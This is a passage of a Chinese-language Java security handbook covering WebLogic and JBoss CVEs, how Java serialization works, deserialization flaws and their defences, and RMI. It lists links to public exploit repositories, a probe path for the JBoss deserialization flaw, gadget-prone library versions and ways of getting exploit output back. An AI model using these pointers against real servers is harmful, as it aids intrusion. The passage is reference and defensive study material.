data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vY3ZlLTIwMTktMjYxOC8=\">https://github.com/jas502n/cve-2019-2618/</span></li>\n</ul>\n</li>\n<li>CVE-2019-2615</li>\n<li>CVE-2019-2568</li>\n<li>CVE-2018-3252</li>\n<li>CVE-2018-3248</li>\n<li>CVE-2018-3245</li>\n<li>CVE-2018-3201</li>\n<li>CVE-2018-3197</li>\n<li>CVE-2018-3191\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZvaWRmeW9vL0NWRS0yMDE4LTMxOTE=\">https://github.com/voidfyoo/CVE-2018-3191</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xpYnJhZ2dib25kL0NWRS0yMDE4LTMxOTE=\">https://github.com/Libraggbond/CVE-2018-3191</span></li>\n</ul>\n</li>\n<li>CVE-2018-2894\n<ul>\n<li>任意文件上传</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjQ1OA==\">https://xz.aliyun.com/t/2458</span></li>\n</ul>\n</li>\n<li>CVE-2018-2893\n<ul>\n<li>反序列化</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzgxMDUuaHRtbA==\">https://www.freebuf.com/vuls/178105.html</span></li>\n</ul>\n</li>\n<li>CVE-2018-2628\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbllZNHpnMm0yeHNxVDBHWGE5cE1HQQ==\">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span></li>\n</ul>\n</li>\n<li>CVE-2018-1258</li>\n<li>CVE-2017-10271\n<ul>\n<li>XMLDecoder 反序列化漏洞</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3dlYmNhY2hlLmdvb2dsZXVzZXJjb250ZW50LmNvbS9zZWFyY2g/cT1jYWNoZSUzQXNIN2o4VEY4dU9JSiUzQXd3dy5mcmVlYnVmLmNvbSUyRnZ1bHMlMkYxNjAzNjcuaHRtbA==\">http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html</span></li>\n</ul>\n</li>\n<li>CVE-2017-3248</li>\n<li>CVE-2016-3510</li>\n<li>CVE-2015-4852\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvbzdicmVhay9zZXJpYWxhdG9y\">https://github.com/roo7break/serialator</span></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"jboss\"><a class=\"anchor\" href=\"#jboss\">#</a> JBoss</h2>\n<h3 id=\"简介-7\"><a class=\"anchor\" href=\"#简介-7\">#</a> 简介</h3>\n<p>JBoss 是一个基于 J2EE 的管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。</p>\n<h3 id=\"相关cve-4\"><a class=\"anchor\" href=\"#相关cve-4\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2017-12149\n<ul>\n<li>反序列化漏洞</li>\n<li>访问  <code>/invoker/readonly</code>  ，页面存在即有反序列化漏洞</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"jetty\"><a class=\"anchor\" href=\"#jetty\">#</a> Jetty</h2>\n<h3 id=\"简介-8\"><a class=\"anchor\" href=\"#简介-8\">#</a> 简介</h3>\n<p>Jetty 是一个开源的 servlet 容器。</p>\n<h1 id=\"沙箱\"><a class=\"anchor\" href=\"#沙箱\">#</a> 沙箱</h1>\n<h2 id=\"简介-9\"><a class=\"anchor\" href=\"#简介-9\">#</a> 简介</h2>\n<p>Java 实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。</p>\n<h2 id=\"相关cve-5\"><a class=\"anchor\" href=\"#相关cve-5\">#</a> 相关 CVE</h2>\n<ul>\n<li>CVE-2012-0507</li>\n<li>CVE-2012-4681</li>\n<li>CVE-2017-3272</li>\n<li>CVE-2017-3289</li>\n</ul>\n<h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"简介-10\"><a class=\"anchor\" href=\"#简介-10\">#</a> 简介</h2>\n<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。Java 中的  <code>ObjectOutputStream</code>  类的  <code>writeObject()</code>  方法可以实现序列化，类  <code>ObjectInputStream</code>  类的  <code>readObject()</code>  方法用于反序列化。如果要实现类的反序列化，则是对其实现  <code>Serializable</code>  接口。</p>\n<p>当远程服务接受不可信的数据并进行反序列化且当前环境中存在可利用的类时，就认为存在反序列化漏洞。</p>\n<h3 id=\"序列数据结构\"><a class=\"anchor\" href=\"#序列数据结构\">#</a> 序列数据结构</h3>\n<ul>\n<li><code>0xaced</code>  魔术头 / STREAM_MAGIC</li>\n<li><code>0x0005</code>  版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants</li>\n<li><code>0x73</code>  对象类型标识</li>\n<li><code>0x72</code>  类描述符标识</li>\n</ul>\n<h3 id=\"序列化流程\"><a class=\"anchor\" href=\"#序列化流程\">#</a> 序列化流程</h3>\n<ul>\n<li>ObjectOutputStream 实例初始化时，将魔术头和版本号写入 bout (BlockDataOutputStream 类型) 中</li>\n<li>调用 ObjectOutputStream.writeObject () 开始写对象数据\n<ul>\n<li>ObjectStreamClass.lookup () 封装待序列化的类描述 (返回 ObjectStreamClass 类型) ，获取包括类名、自定义 serialVersionUID、可序列化字段 (返回 ObjectStreamField 类型) 和构造方法，以及 writeObject、readObject 方法等</li>\n<li>writeOrdinaryObject () 写入对象数据\n<ul>\n<li>写入对象类型标识</li>\n<li>writeClassDesc () 进入分支  writeNonProxyDesc () 写入类描述数据\n<ul>\n<li>写入类描述符标识</li>\n<li>写入类名</li>\n<li>写入 SUID (当 SUID 为空时，会进行计算并赋值)</li>\n<li>计算并写入序列化属性标志位</li>\n<li>写入字段信息数据</li>\n<li>写入 Block Data 结束标识</li>\n<li>写入父类描述数据</li>\n</ul>\n</li>\n<li>writeSerialData () 写入对象的序列化数据\n<ul>\n<li>若类自定义了 writeObject ()，则调用该方法写对象，否则调用 defaultWriteFields () 写入对象的字段数据 (若是非原始类型，则递归处理子对象)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"53713-反序列化流程\"><a class=\"anchor\" href=\"#53713-反序列化流程\">#</a> 5.3.7.1.3. 反序列化流程</h3>\n<ul>\n<li>\n<p>ObjectInputStream 实例初始化时，读取魔术头和版本号进行校验</p>\n</li>\n<li>\n<p>调用 ObjectInputStream.readObject () 开始读对象数据</p>\n<ul>\n<li>读取对象类型标识</li>\n<li>readOrdinaryObject () 读取数据对象\n<ul>\n<li>readClassDesc () 读取类描述数据\n<ul>\n<li>读取类描述符标识，进入分支 readNonProxyDesc ()</li>\n<li>读取类名</li>\n<li>读取 SUID</li>\n<li>读取并分解序列化属性标志位</li>\n<li>读取字段信息数据</li>\n<li>resolveClass () 根据类名获取待反序列化的类的 Class 对象，如果获取失败，则抛出 ClassNotFoundException</li>\n<li>skipCustomData () 循环读取字节直到 Block Data 结束标识为止</li>\n<li>读取父类描述数据</li>\n<li>initNonProxy () 中判断对象与本地对象的 SUID 和类名 (不含包名) 是否相同，若不同，则抛出 InvalidClassException</li>\n</ul>\n</li>\n<li>ObjectStreamClass.newInstance () 获取并调用离对象最近的非 Serializable 的父类的无参构造方法 (若不存在，则返回 null) 创建对象实例</li>\n<li>readSerialData () 读取对象的序列化数据\n<ul>\n<li>若类自定义了 readObject ()，则调用该方法读对象，否则调用 defaultReadFields () 读取并填充对象的字段数据</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"5372-漏洞利用\"><a class=\"anchor\" href=\"#5372-漏洞利用\">#</a> 5.3.7.2. 漏洞利用</h2>\n<h3 id=\"53721-存在危险的基础库\"><a class=\"anchor\" href=\"#53721-存在危险的基础库\">#</a> 5.3.7.2.1. 存在危险的基础库</h3>\n<ul>\n<li><code>com.mchange:c3p0 0.9.5.2</code></li>\n<li><code>com.mchange:mchange-commons-java 0.2.11</code></li>\n<li><code>commons-beanutils 1.9.2</code></li>\n<li><code>commons-collections 3.1</code></li>\n<li><code>commons-fileupload 1.3.1</code></li>\n<li><code>commons-io 2.4</code></li>\n<li><code>commons-logging 1.2</code></li>\n<li><code>org.apache.commons:commons-collections 4.0</code></li>\n<li><code>org.beanshell:bsh 2.0b5</code></li>\n<li><code>org.codehaus.groovy:groovy 2.3.9</code></li>\n<li><code>org.slf4j:slf4j-api 1.7.21</code></li>\n<li><code>org.springframework:spring-aop 4.1.4.RELEASE</code></li>\n</ul>\n<h3 id=\"53722-回显方式\"><a class=\"anchor\" href=\"#53722-回显方式\">#</a> 5.3.7.2.2. 回显方式</h3>\n<ul>\n<li>通过中间件特性回显</li>\n<li>通过抛出异常回显</li>\n<li>通过 OOB 回显</li>\n<li>通过写静态文件回显</li>\n</ul>\n<h2 id=\"5373-漏洞修复和防护\"><a class=\"anchor\" href=\"#5373-漏洞修复和防护\">#</a> 5.3.7.3. 漏洞修复和防护</h2>\n<h3 id=\"53731-hook-resolveclass\"><a class=\"anchor\" href=\"#53731-hook-resolveclass\">#</a> 5.3.7.3.1. Hook resolveClass</h3>\n<p>在使用  <code>readObject()</code>  反序列化时会调用  <code>resolveClass</code>  方法读取反序列化的类名，可以通过 hook 该方法来校验反序列化的类，一个 Demo 如下</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectStreamClass</span> desc<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>desc<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SerialObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidClassException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token string\">\"Unauthorized deserialization attempt\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                desc<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span>desc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>以上的 Demo 就只允许序列化  <code>SerialObject</code>  ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic 等都使用了这种方式来防御。</p>\n<h3 id=\"53732-validatingobjectinputstream\"><a class=\"anchor\" href=\"#53732-validatingobjectinputstream\">#</a> 5.3.7.3.2. ValidatingObjectInputStream</h3>\n<p>Apache Commons IO Serialization 包中的  <code>ValidatingObjectInputStream</code>  类提供了  <code>accept</code>  方法，可以通过该方法来实现反序列化类白 / 黑名单控制，一个 demo 如下</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> buffer<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">,</span> <span class=\"token class-name\">ConfigurationException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">ByteArrayInputStream</span> bais <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">ValidatingObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ValidatingObjectInputStream</span><span class=\"token punctuation\">(</span>bais<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    ois<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SerialObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    obj <span class=\"token operator\">=</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> obj<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"53733-objectinputfilterjep290\"><a class=\"anchor\" href=\"#53733-objectinputfilterjep290\">#</a> 5.3.7.3.3. ObjectInputFilter(JEP290)</h3>\n<p>Java 9 提供了支持序列化数据过滤的新特性，可以继承  <code>java.io.ObjectInputFilter</code>  类重写  <code>checkInput</code>  方法来实现自定义的过滤器，并使用  <code>ObjectInputStream</code>  对象的  <code>setObjectInputFilter</code>  设置过滤器来实现反序列化类白 / 黑名单控制。这个机制本身是针对 Java 9 的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对 JDK 6,7,8 进行了支持。这个机制主要描述了如下的机制：</p>\n<ul>\n<li>提供一个限制反序列化类的机制，白名单或者黑名单</li>\n<li>限制反序列化的深度和复杂度</li>\n<li>为 RMI 远程调用对象提供了一个验证类的机制</li>\n<li>定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器</li>\n</ul>\n<h1 id=\"rmi\"><a class=\"anchor\" href=\"#rmi\">#</a> RMI</h1>\n<h2 id=\"简介-11\"><a class=\"anchor\" href=\"#简介-11\">#</a> 简介</h2>\n<p>RMI (Remote Method Invocation，远程方法调用) 能够让在客户端 Java 虚拟机上的对象像调用本地对象一样调用服务端 Java 虚拟机中的对象上的方法。其中 RMI 标准实现是 Java RMI，之外还有 Weblogic RMI、Spring RMI 等不同的实现。</p>\n<p>RMI 中比较重要的两个概念是 Stub 和 Skeleton，Stub 和 Skeleton 对同一套接口进行实现，其中 Stub 由 Client 端调用，并不进行真正的实现，而是和 Server 端通信。Skeleton 是 Server 端，监听来自 Stub 的连接，根据 Stub 发送的数据进行真正的操作。</p>\n<h2 id=\"调用步骤\"><a class=\"anchor\" href=\"#调用步骤\">#</a> 调用步骤</h2>\n<ul>\n<li>客户调用客户端辅助对象 Stub 上的方法</li>\n<li>客户端辅助对象 Stub 打包调用信息 (变量，方法名)，通过网络发送给服务端辅助对象 Skeleton</li>\n<li>服务端辅助对象 Skeleton 将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li>\n<li>调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象 Skeleton</li>\n<li>服务端辅助对象将结果打包，发送给客户端辅助对象 Stub</li>\n<li>客户端辅助对象将返回值解包，返回给调用者</li>\n<li>客户获得返回值</li>\n</ul>\n<h2 id=\"样例\"><a class=\"anchor\" href=\"#样例\">#</a> 样例</h2>\n<p>一份代码样例如下 (来自《Enterprise JavaBeans》)：</p>\n<h3 id=\"person接口定义\"><a class=\"anchor\" href=\"#person接口定义\">#</a> Person 接口定义</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"使用personserver实现person\"><a class=\"anchor\" href=\"#使用personserver实现person\">#</a> 使用 PersonServer 实现 Person</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">PersonServer</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">PersonServer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"使用person_stub实现person\"><a class=\"anchor\" href=\"#使用person_stub实现person\">#</a> 使用 Person_Stub 实现 Person</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Socket</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person_Stub</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Socket</span> socket<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person_Stub</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// connect to skeleton</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        socket <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Socket</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"computer_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// pass method name to skeleton</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"age\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> inStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> inStream<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\">// pass method name to skeleton</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> inStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>inStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"skeleton的实现\"><a class=\"anchor\" href=\"#skeleton的实现\">#</a> Skeleton 的实现</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Socket</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token 